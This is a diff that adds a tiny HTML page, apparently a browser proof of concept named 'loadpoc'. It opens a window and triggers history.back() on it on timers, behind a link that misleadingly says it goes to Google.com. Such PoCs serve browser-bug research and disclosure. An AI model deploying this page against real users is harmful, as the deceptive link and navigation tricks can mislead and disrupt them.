@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>Loop?</title>
+</head>
+<body>
+<script>
+
+function loadpoc() {
+
+a = window.open("/index.html" , "postepone");
+setTimeout("a.history.back();" , 4000);
+setTimeout("a.history.back();" , 5000);
+}
+
+</script>
+
+<a href="#" onclick="loadpoc();">ClickMe to go on Google.com</a>
+</body>
+</html>
